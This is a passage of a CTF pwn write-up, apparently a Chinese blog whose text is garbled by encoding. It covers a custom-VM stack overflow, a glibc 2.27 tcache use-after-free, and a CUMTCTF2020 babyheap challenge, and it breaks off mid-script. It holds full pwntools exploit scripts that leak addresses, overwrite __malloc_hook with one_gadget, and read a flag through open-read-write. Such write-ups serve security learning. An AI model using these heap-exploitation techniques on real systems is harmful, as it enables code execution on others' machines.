0x5F, 0x5F, \n  0x5F, 0x33, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x11, 0x20, 0x20, 0x20, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x33, \n  0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, \n  0x20, 0x20, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x33, 0x20, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x20, 0x20, \n  0x20, 0x20, 0x20, 0x20, 0x20, 0x33, 0x28, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x11, 0x5F, 0x20, 0x20, 0x20, 0x20, \n  0x20, 0x5F, 0x20, 0x33, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x11, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x5F, \n  0x5F, 0x33, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x11, 0x5F, 0x20, 0x20, 0x5F, 0x5F, 0x5F, 0x0A, 0x00, 0x33, \n  0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x52, 0x11, \n  0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x13, 0x47, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8F, 0x01, 0x11, \n  0x2F, 0x20, 0x20, 0x5F, 0x5F, 0x5F, 0x7C, 0x20, 0x33, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x20, \n  0x20, 0x20, 0x2F, 0x20, 0x20, 0x20, 0x33, 0x08, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x7C, 0x20, 0x2F, 0x20, \n  0x20, 0x5F, 0x5F, 0x5F, 0x33, 0x10, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x11, 0x7C, 0x20, 0x7C, 0x5F, 0x20, 0x20, \n  0x20, 0x5F, 0x33, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x11, 0x7C, 0x20, 0x7C, 0x20, 0x20, 0x5F, 0x5F, 0x5F, \n  0x33, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, \n  0x7C, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7C, 0x33, 0x28, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x7C, \n  0x20, 0x20, 0x20, 0x2F, 0x20, 0x2F, 0x33, 0x30, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x20, 0x20, 0x20, \n  0x20, 0x2F, 0x20, 0x20, 0x33, 0x38, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x11, 0x20, 0x7C, 0x2F, 0x20, 0x20, 0x20, \n  0x7C, 0x0A, 0x33, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x44, 0x52, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x13, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x8F, 0x01, 0x11, 0x7C, 0x20, 0x7C, 0x20, 0x20, 0x20, 0x20, \n  0x20, 0x33, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x11, 0x20, 0x20, 0x20, 0x2F, 0x20, 0x2F, 0x7C, 0x20, 0x33, \n  0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x7C, \n  0x20, 0x7C, 0x20, 0x7C, 0x20, 0x20, 0x20, 0x33, 0x10, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x20, 0x20, \n  0x20, 0x7C, 0x20, 0x7C, 0x20, 0x33, 0x18, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x20, 0x7C, 0x20, 0x7C, \n  0x5F, 0x5F, 0x20, 0x33, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x11, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, \n  0x7C, 0x33, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x11, 0x20, 0x7C, 0x20, 0x20, 0x2F, 0x20, 0x2F, 0x20, 0x33, \n  0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, \n  0x20, 0x20, 0x20, 0x2F, 0x20, 0x2F, 0x7C, 0x33, 0x38, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x20, 0x20, \n  0x2F, 0x7C, 0x20, 0x7C, 0x0A, 0x33, 0x40, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x44, 0x52, 0x11, 0x01, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x13, 0x48, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x8F, 0x01, 0x11, 0x7C, 0x20, 0x7C, 0x20, \n  0x20, 0x5F, 0x20, 0x20, 0x33, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x11, 0x20, 0x20, 0x2F, 0x20, 0x2F, 0x20, \n  0x7C, 0x20, 0x33, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x11, 0x7C, 0x20, 0x7C, 0x20, 0x7C, 0x20, 0x20, 0x20, \n  0x33, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, \n  0x20, 0x20, 0x20, 0x20, 0x7C, 0x20, 0x7C, 0x20, 0x33, 0x18, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x20, \n  0x7C, 0x20, 0x20, 0x5F, 0x5F, 0x7C, 0x33, 0x20, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x20, 0x20, 0x20, \n  0x20, 0x20, 0x20, 0x7C, 0x33, 0x28, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x11, 0x20, 0x7C, 0x20, 0x2F, 0x20, 0x2F, \n  0x20, 0x20, 0x33, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x11, 0x20, 0x20, 0x20, 0x2F, 0x20, 0x2F, 0x20, 0x7C, \n  0x33, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, \n  0x5F, 0x5F, 0x2F, 0x20, 0x7C, 0x20, 0x7C, 0x0A, 0x33, 0x40, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x52, 0x11, 0x01, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x13, 0x48, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8F, 0x01, 0x11, 0x7C, \n  0x20, 0x7C, 0x5F, 0x7C, 0x20, 0x7C, 0x20, 0x33, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x2F, 0x20, \n  0x2F, 0x20, 0x20, 0x7C, 0x20, 0x33, 0x08, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x11, 0x7C, 0x20, 0x7C, 0x20, 0x7C, \n  0x5F, 0x5F, 0x5F, 0x33, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x11, 0x20, 0x20, 0x20, 0x20, 0x7C, 0x20, 0x7C, \n  0x20, 0x33, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x11, 0x20, 0x20, 0x7C, 0x20, 0x7C, 0x20, 0x20, 0x20, 0x33, \n  0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, \n  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7C, 0x33, 0x28, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x7C, 0x2F, \n  0x20, 0x2F, 0x20, 0x20, 0x20, 0x33, 0x30, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x20, 0x2F, 0x20, 0x2F, \n  0x20, 0x20, 0x20, 0x33, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x11, 0x20, 0x20, 0x20, 0x20, 0x7C, 0x20, 0x7C, \n  0x0A, 0x33, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, \n  0x52, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x13, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8F, \n  0x01, 0x11, 0x5C, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x2F, 0x20, \n  0x33, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, \n  0x2F, 0x5F, 0x2F, 0x20, 0x20, 0x20, 0x7C, 0x5F, 0x33, 0x08, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x7C, 0x20, \n  0x5C, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x33, 0x10, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x7C, 0x20, 0x20, 0x20, \n  0x7C, 0x5F, 0x7C, 0x20, 0x33, 0x18, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x11, 0x20, 0x20, 0x7C, 0x5F, 0x7C, 0x20, \n  0x20, 0x20, 0x33, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x11, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7C, \n  0x33, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, \n  0x5F, 0x5F, 0x5F, 0x2F, 0x20, 0x20, 0x20, 0x20, 0x33, 0x30, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x2F, \n  0x5F, 0x2F, 0x20, 0x20, 0x20, 0x20, 0x33, 0x38, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x20, 0x20, 0x20, \n  0x7C, 0x5F, 0x7C, 0x0A, 0x33, 0x40, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x44, 0x52, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x13, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x8F, 0x01, 0x88, 0xD2, 0xF7, 0xFF, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00\n};\n```\n\næ¥ä¸‹æ¥è¯¥å†™å‡ºæ±‡ç¼–é€»è¾‘äº†\n\n```c\njmp 0x3a5\nsub rspï¼Œ0x100 //å…³é”®ç‚¹\nmov a0, 0x2323232323232323\nmov [buf+0x0],a0\nmov a0, 0x2323232323232323\nmov [buf+0x8],a0\nmov a0, 0x2323232323232323\nmov [buf+0x10],a0\nmov a0, 0x2323232323232323\nmov [buf+0x18],a0\nmov a0, 0x2323232323232323\nmov [buf+0x20],a0\nmov a0,0xa\nmov [buf+0x28],a0\nmov a0,[buf+0x0]\npush a0\npop a1\nmov a0,1\nmov a2, 0x29\nsyscall 1 //write\nmov a0, 0x2020202020202023\nmov [buf+0x0],a0\nmov a0, 0x6d6f636c65772020\nmov [buf+0x8],a0\nmov a0, 0x323032206f742065\nmov [buf+0x10],a0\nmov a0, 0x2046544341472030\nmov [buf+0x18],a0\nmov a0, 0x2320202020202020\nmov [buf+0x20],a0\nmov a0, 0xa\nmov [buf+0x28],a0\nlea a0,[buf+0x0]\npush a0\npop a1\nmov a0, 0x1\nmov a2, 0x29\nsyscall 1 //write\nmov a0, 0x7369687420202023\nmov [buf+0x0],a0\nmov a0, 0x656d206120736920\nmov [buf+0x8],a0\nmov a0, 0x7266206567617373\nmov [buf+0x10],a0\nmov a0, 0x616d206d76206d6f\nmov [buf+0x18],a0\nmov a0, 0x232020656e696863\nmov [buf+0x20],a0\nmov a0, 0xa\nmov [buf+0x28],a0\nlea a0,[buf+0x0]\npush a0\npop a1\nmov a0, 0x1\nmov a2, 0x29\nsyscall 1 //write\nmov a0, 0x2323232323232323\nmov [buf+0x0],a0\nmov a0, 0x2323232323232323\nmov [buf+0x8],a0\nmov a0, 0x2323232323232323\nmov [buf+0x10],a0\nmov a0, 0x2323232323232323\nmov [buf+0x18],a0\nmov a0, 0x2323232323232323\nmov [buf+0x20],a0\nmov a0, 0xa\nmov [buf+0x28],a0\nlea a0,[buf+0x0]\npush a0\npop a1\nmov a0, 0x1\nmov a2, 0x29\nsyscall 1 //write\nmov a0, 0x656d206c6c657423\nmov [buf+0x0],a0\nmov a0, 0x7369207461687720\nmov [buf+0x8],a0\nmov a0, 0x616e2072756f7920\nmov [buf+0x10],a0\nmov a0, 0x3a656d\nmov [buf+0x18],a0\nlea a0,[buf+0x0]\npush a0\npop a1\nmov a0, 0x1\nmov a2, 0x1b\nsyscall 1 //write\nmov a0, sp\npush a0\npop a1\nmov a0, 0x0\nmov a2, 0x1000\nsyscall 0 //read\nmov a0, sp\nsyscall 2 //puts\nmov a0, 0x20746168772c6b6f\nmov [buf+0x0],a0\nmov a0, 0x7720756f79206f64\nmov [buf+0x8],a0\nmov a0, 0x73206f7420746e61\nmov [buf+0x10],a0\nmov a0, 0x3a7961\nmov [buf+0x18],a0\nlea a0,[buf+0x0]\npush a0\npop a1\nmov a0, 0x1\nmov a2, 0x1b\nsyscall 1 //write\nmov a0, sp\npush a0\npop a1\nmov a0, 0x0\nmov a2, 0x1000\nsyscall 0 //read\nmov a0, 0x657220492c776f4e\nmov [buf+0x0],a0\nmov a0, 0x6f79206569766563\nmov [buf+0x8],a0\nmov a0, 0x617373656d207275\nmov [buf+0x10],a0\nmov a0, 0xa7e6579622c6567\nmov [buf+0x18],a0\nlea a0,[buf+0x0]\npush a0\npop a1\nmov a0, 0x1\nmov a2, 0x20\nsyscall 1 //write\npop256\nret\n```\n\nå¥½äº†ï¼Œè¦å¼€å§‹pwnçš„éƒ¨åˆ†äº†\n\nè¦æ³¨æ„è¿™é‡Œçš„callï¼Œä¿å­˜æŒ‡é’ˆä¸æ˜¯å¸¸è§„æ„ä¹‰ä¸Šçš„â€å‹æ ˆâ€ï¼Œå®ƒrspæ˜¯å¢åŠ çš„ï¼ˆåŒç†retçš„rspæ˜¯å‡çš„ï¼‰\n\nread 0x1000æ˜æ˜¾æ ˆæº¢å‡ºï¼Œé€šè¿‡è°ƒè¯•ï¼Œç†æ¸…æ¥šç»“æ„\n\n![](https://i.loli.net/2020/09/20/TZtCDByOhWw4Maq.png)\n\næ­¤æ—¶æ˜¯ç³»ç»Ÿè°ƒç”¨writeä¹‹å‰ï¼Œ\n\nåœ¨æ­¤ä¹‹å‰ä¼šæœ‰ä¸€ä¸ªpushæ“ä½œï¼Œå†…å®¹æ˜¯[buf+0x00]\n\nçœ‹ä¸€ä¸‹æ ˆæƒ…å†µ\n\n![image-20200920185428434](https://i.loli.net/2020/09/20/sBD5fEgCiuLGNnW.png)\n\nå¯ä»¥çœ‹åˆ°å¤šäº†ä¸€å—åœ°å€ï¼Œæ˜¯æŒ‡å‘å†…å­˜æ•°æ®åŒºçš„ï¼Œæ‰€ä»¥å¯ä»¥æ³„éœ²å‡ºheap_base\n\nç”±äºç¨‹åºå¼€äº†æ²™ç›’æ‰€ä»¥è¦ç”¨orw\n\nå†™å‡ºsyscallçš„å‡½æ•°å³å¯ã€‚\n\néœ€è¦æ³¨æ„çš„ç‚¹ï¼š\n\n![image-20200925220738694](https://i.loli.net/2020/09/25/8oCkpEaHAQ5Tly6.png)\n\nå…¶å®ç³»ç»Ÿè°ƒç”¨ä¹Ÿæ˜¯è™šæ‹Ÿç³»ç»Ÿè°ƒç”¨ï¼Œåœ¨è¿™é‡Œï¼Œåˆ†åˆ«ä¸º0ï¼Œ1ï¼Œ2ï¼Œ3\n\næ„é€ è°ƒç”¨å‡½æ•°æ—¶ä¹Ÿå¹¶éå¸¸è§„æ„ä¹‰çš„syscallï¼Œè¦ç†è§£è™šæ‹ŸæŒ‡ä»¤é›†æ¥è‡ªå·±æ„é€ \n\n## exp\n\n```python\nfrom pwn import *\n#io=remote('124.70.153.199',8666)\nio = process('./vmpwn')\nlibc=ELF('libc-2.23.so')\n#context.log_level = 'debug'\nio.recv()\npay='a'*0x100\nio.send(pay)\nio.recvuntil('a'*0x100)\nelf_base=u64(io.recv(6)+'\\x00\\x00')-0x203851#leak elf_base\npay='b'*0xf0 + 'd'*0x10 + p64(elf_base+0x203020)#ret ip\nio.send(pay)\nio.recvuntil('tell me what is your name:')\npay='a'*0xf0\nio.send(pay)\nio.recvuntil('a'*0xf0)\nheap_base=u64(io.recv(6)+'\\x00\\x00')#leak heap_base\nsuccess('heap_base:'+hex(heap_base))\n# pause()\ndef call(a,b,c,ord):#def virtual syscall\n\tpay1='\\x11'\n \tpay1+=p64(a)\n\tpay1+='\\x12'\n \tpay1+=p64(b)\n \tpay1+='\\x13'\n \tpay1+=p64(c)\n \tpay1+='\\x8f'\n \tif ord==0:\n \t\tpay1+='\\x00'\n \tif ord==1:\n \t\tpay1+='\\x01'\n \tif ord==2:\n \t\tpay1+='\\x02'\n \treturn pay1\n\npay2=call(1,elf_base+0x2038E0,0x8,1)#  wrr  # sys_read\npay2+=call(0,elf_base+0x2038f8,0x8,0)# sys_free\npay2+=call(0,heap_base+0x2D18+0x110+87,0x1000,0)\npay=''\npay=pay.ljust(0x100,'\\x00')+p64(heap_base+0x2D18+0x110)+'\\x00'*8\npay+=pay2\nio.send(pay)\nlibc_base=u64(io.recvuntil('\\x7f')[-6:]+'\\x00\\x00')-libc.sym['read']\nlibc.address=libc_base #leak libc_base\nsystem_addr=libc.sym['system']\nbin_sh_addr=libc.search('/bin/sh\\x00').next()\nio.send(p64(libc.sym['open']))\npay=''\npay+='\\x11flag\\x00\\x00\\x00\\x00'\npay+='\\x33'+'\\x00'*8\npay+='\\x20'+'\\x00'*8\npay+='\\x12'\npay+=p64(0)\npay+='\\x13'\npay+=p64(0)\npay+='\\x8f'\npay+='\\x03'#free -> open\npay+=call(3,heap_base+0x2D18,0x30,0)#orw\npay+=call(1,heap_base+0x2D18,0x30,1)\npay+=call(0,heap_base+0x2D18,0x1000,0)+'\\xff'\nio.send(pay)\nsuccess('libc_base:'+hex(libc_base))\nsuccess('heap_base:'+hex(heap_base))\nsuccess('elf_base:'+hex(elf_base))\nio.interactive()\n```\n\nåœ¨æœ¬åœ°å†™ä¸ªflagæ–‡ä»¶ï¼ŒæˆåŠŸ~\n\n![image-20200925225109306](https://i.loli.net/2020/09/25/HOVmvYPZo5M7NBe.png)\n\n# 0x02 é’“é±¼åŸæ¯ veryeasy\n\nç¬¬ä¸€æ¬¡åšglibc2.27ï¼Œå¤šäº†ä¸ªtcacheæœºåˆ¶ä»¥åŠIOfileçš„åˆ©ç”¨ï¼Œæ‰€ä»¥ï¼Œï¼Œåˆå¾—å»å­¦äº†\n\nç›´æ¥å»æ’¸æºç \n\næœ‰ä¸€ä¸ªå‘ç‚¹æ˜¯Ubuntuå°½é‡ä¸è¦ç‚¹å‡çº§ï¼Œä¸çŸ¥ä»€ä¹ˆæ—¶å€™æˆ‘çš„18.4å·²ä¸æ˜¯18.4äº†å‡åˆ°äº†19ï¼Œæ‰€ä»¥tcacheå®Œå–„ä¹‹åæ€»æ˜¯æ‰“ä¸é€šï¼Œæ²¡åŠæ³•æ¢å¤åˆ°äº†ä¹‹å‰çš„å¿«ç…§æ‰å¾—ä»¥å®Œæˆè¿™é“é¢˜\n\nçœ‹ä¸‹ç¨‹åº\n\n![image-20200927004436835](https://i.loli.net/2020/09/27/5SXVB3nkCDWEZdJ.png)\n\nå…ˆç”³è¯·åä¸ªå †å—ç»•è¿‡æ£€æŸ¥\n\næ¥ç€å°±æ˜¯tcacheçš„uafæ¼æ´ï¼Œ1/16æ¦‚ç‡\n\næ€è·¯ï¼š\n\nç»•è¿‡ifæ£€æŸ¥ä¹‹åï¼Œfreeæ‰7ä¸ªå¡«æ»¡tcacheï¼Œç¬¬å…«ä¸ªä¼šæ”¾å…¥unsortedbinï¼Œä¿®æ”¹fdä¸ºstdout1/16çš„æ¦‚ç‡ï¼Œä¹‹åæŠŠstdout mallocå‡ºæ¥æ”¹å†™ä¸€ä¸‹å°±å¯ä»¥leakä¿¡æ¯ã€‚è·å¾—libcåŸºå€åå°±å¯ä»¥ç®—malloc_hookçš„åœ°å€ã€‚ä¸è¿‡è¿™é¢˜ä¸èƒ½ç›´æ¥å‘malloc_hookä¸­å†™å…¥one_gadgetï¼Œå¾—åˆ©ç”¨reallocå‡½æ•°åšä¸­ä¸“æ¥æ»¡è¶³one_gadgetçš„æ¡ä»¶ã€‚\n\n\n\n## exp\n\næ³¨é‡Šæ‰çš„ä¸€éƒ¨åˆ†æ˜¯ç½‘ä¸Šçš„åŸexpï¼Œä½†æœ‰äº›éº»çƒ¦å¯ä»¥ä¸é‡‡ç”¨ï¼ŒåŸç†å¤§æ¦‚å°±æ˜¯å…ˆç”³è¯·åˆ°stdinçš„åœ°å€çˆ†ç ´å‡ºä½ç¬¬å››ä½çš„åœ°å€ï¼Œç„¶åå†ä¿®æ”¹åˆ°stdoutå¤„ã€‚\n\nè¿™é‡Œæ”¹ä¸€ä¸‹ç›´æ¥æ”¹å†™stdout\n\n```python\n#!/usr/bin/python\n#-*-coding:utf8-*-\nfrom pwn import *\nlibc = ELF('./libc-2.27.so')\n#context.log_level = 'debug'\ndef Add(index, size, content, p):\n    p.sendlineafter('Your choice :', '1')\n    p.sendlineafter('id:', str(index))\n    p.sendlineafter('size:', str(size))\n    p.sendafter('content:', content)\n\ndef Edit(index, content, p):\n    p.sendlineafter('Your choice :', '2')\n    p.sendlineafter('id:', str(index))\n    p.sendafter('content:', content)\n\ndef Delete(index, p):\n    p.sendlineafter('Your choice :', '3')\n    p.sendlineafter('id:', str(index))\n\ndef pwn():\n    p = process('./veryeasy')\n    Add(0, 0x80, 'A'*0x10, p)\n    Add(1, 0x80, 'A'*0x10, p)\n    Add(2, 0x80, 'A'*0x10, p)\n    Add(3, 0x80, 'A'*0x10, p)\n    Add(4, 0x80, 'A'*0x10, p)\n    Add(5, 0x80, 'A'*0x10, p)\n    Add(6, 0x80, 'A'*0x10, p)\n    Add(7, 0x80, 'A'*0x10, p)\n    Add(8, 0x80, 'A'*0x10, p)\n    Add(9, 0x80, 'A'*0x10, p)\n    Delete(0, p)\n    Delete(1, p)\n    Delete(2, p)\n    Delete(3, p)\n    Delete(4, p)\n    Delete(5, p)\n    Delete(0, p)\n    Delete(0, p)\n    #Edit(0, '\\x88\\xfa', p)\n    #Add(10, 0x80, 'A'*0x10, p)#0\n    #Add(11, 0x80, 'A'*0x10, p)#fa88 ->try 1/16\n    #tcache: fa88(fd)->x8d0\n    #Delete(2, p)# 2->x8d0\n    # æ”¹å†™fdæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘stdout\n    #Edit(2, '\\x60\\x07', p)\n    #Add(12, 0x80, 'A'*0x10, p)\n\tEdit(0,'\\x60\\x07',p)\n    Add(10,0x80,'A'*0x10,p)\n    try:#_IO_2_1_stdout_\n        Add(11, 0x80, p64(0xfbad1800) + p64(0)*3 + '\\x00', p)\n        #å…³é”®ç‚¹ï¼Œçœ‹æºç ç†è§£\n        gdb.attach(p)\n        libc_base = u64(p.recvuntil('\\x7f')[-6:] + '\\x00\\x00') - 0x3ed8b0\n        info(\"libc_base ==> \" + hex(libc_base))\n        libc.address = libc_base\n    except:\n        p.close()\n        return 0\n    if (libc_base >> 40) != 0x7f:\n        return 0\n\n    malloc_hook = libc.symbols['__malloc_hook']\n    info(\"malloc_hook ==> \" + hex(malloc_hook))\n    realloc = libc.symbols['__libc_realloc']\n    malloc = libc.symbols['__libc_malloc']\n    a = [0x4f365, 0x4f3c2, 0x10a45c]\n    one_gadget = libc_base + a[2]\n\n    Delete(0, p)\n    Edit(0, p64(malloc_hook-0x8), p)\n    Add(14, 0x80, 'A'*0x10, p)\n    Add(15, 0x80,p64(one_gadget) + p64(realloc+0x6), p)\n    p.sendlineafter('Your choice :', '1')\n    p.sendlineafter('id:', '16')\n    p.sendlineafter('size:', str(0x80))\n    p.interactive()\n    p.close()\n    return 1\n\nif __name__ == '__main__':\n    while True:\n        a = pwn()\n        if a:\n            break\n```\n\n***referenceï¼š***\n\n[IOFILEæ³„éœ²libc](https://n0va-scy.github.io/2019/09/21/IO_FILE/)\n\n\n\n# 0x03 CUMTCTF2020 babyheap\n\nè¿™æ˜¯å¾ˆæ—©åšè¿‡çš„é¢˜ç¨å¾®æ”¹äº†æ”¹æ”¾åœ¨äº†æ ¡èµ›\n\nå…ˆæŸ¥çœ‹ä¸€ä¸‹ä¿æŠ¤ï¼Œå¯æ”¹å†™gotè¡¨ã€‚UAF+Double free\n\naddå‡½æ•°\n\næ¯æ¬¡addéƒ½ä¼šmallocäº†ä¸¤ä¸ªå †ï¼š\n\nsç›¸å½“äºæŒ‡é’ˆæ•°ç»„ï¼Œåˆ†åˆ«å­˜æ”¾æ ‡å¿—ä½ã€bufæŒ‡é’ˆã€messageï¼›\n\nbufå­˜æ”¾game message\n\n```c\nint add()\n{\n  size_t size; // [rsp+0h] [rbp-20h]\n  void *s; // [rsp+8h] [rbp-18h]\n  void *buf; // [rsp+10h] [rbp-10h]\n  unsigned __int64 v4; // [rsp+18h] [rbp-8h]\n\n  v4 = __readfsqword(0x28u);\n  s = 0LL;\n  buf = 0LL;\n  LODWORD(size) = 0;\n  if ( (unsigned int)count > 9 )\n    return puts(\"Too much!!!\");\n  s = malloc(0x28uLL);\n  memset(s, 0, 0x28uLL);\n  puts(\"size of the game's name: \");\n  if ( (unsigned int)__isoc99_scanf(\"%u\", &size) == -1 )\n    exit(-1);\n  buf = malloc((unsigned int)size);\n  if ( !buf )\n  {\n    puts(\"Error !!\");\n    exit(-1);\n  }\n  puts(\"game's name:\");\n  read(0, buf, (unsigned int)size);\n  *((_QWORD *)s + 1) = buf;\n  puts(\"game's message:\");\n  __isoc99_scanf(\"%23s\", (char *)s + 16);\n  *(_DWORD *)s = 1;\n  for ( HIDWORD(size) = 0; HIDWORD(size) <= 9; ++HIDWORD(size) )\n  {\n    if ( !list[HIDWORD(size)] )\n    {\n      list[HIDWORD(size)] = s;\n      break;\n    }\n  }\n  ++count;\n  return puts(\"Added!\");\n}\n```\n\ndeleteå‡½æ•°ï¼Œå­˜åœ¨uafæ¼æ´ï¼Œ\n\n```c\nint del()\n{\n  int result; // eax\n  unsigned int v1; // [rsp+4h] [rbp-Ch]\n  unsigned __int64 v2; // [rsp+8h] [rbp-8h]\n\n  v2 = __readfsqword(0x28u);\n  if ( !count )\n    return puts(\"Null!\");\n  puts(\"game's index:\");\n  __isoc99_scanf(\"%d\", &v1);\n  if ( v1 <= 9 && list[v1] )\n  {\n    *list[v1] = 0;\n    free(*((void **)list[v1] + 1));\n    result = puts(\"Deleted!\");\n  }\n  else\n  {\n    puts(\"index error!\");\n    result = 0;\n  }\n  return result;\n}\n```\n\næ³„éœ²main_arena+88çš„åœ°å€ï¼Œä»è€Œè®¡ç®—libcåŸºå€ï¼Œä½¿ç”¨doublefreeä»è€Œæ”¹å†™malloc_hookçš„åœ°å€ï¼Œgetshellã€‚\n\n## exp\n\n```python\nfrom pwn import*\ncontext.log_level = 'debug'\ndef menu(ch):\n\tp.sendlineafter('choice :',str(ch))\ndef new(size,name,content):\n\tmenu(1)\n\tp.sendlineafter(\"game's name:\",str(size))\n\tp.sendafter(\"game's name:\",name)\n\tp.sendlineafter(\"game's message:\",content)\ndef free(index):\n\tmenu(3)\n\tp.sendlineafter('index:',str(index))\ndef show():\n\tmenu(2)\np = process('./babyheap')\nlibc = ELF('./libc-2.23.so')\nnew(0x100,'1111','1111')\nnew(0x68,'1111','1111')\nnew(0x68,'1111','1111')\nfree(0)#unsortedbin\nnew(0xD0,'\\x78','\\x78')\nshow()\nlibc_base = u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) - libc.sym['__malloc_hook'] - 0x68\nlog.info('libc:\\t' + hex(libc_base))\nmalloc_hook = libc_base + libc.sym['__malloc_hook']\nprint hex(malloc_hook)\nog = 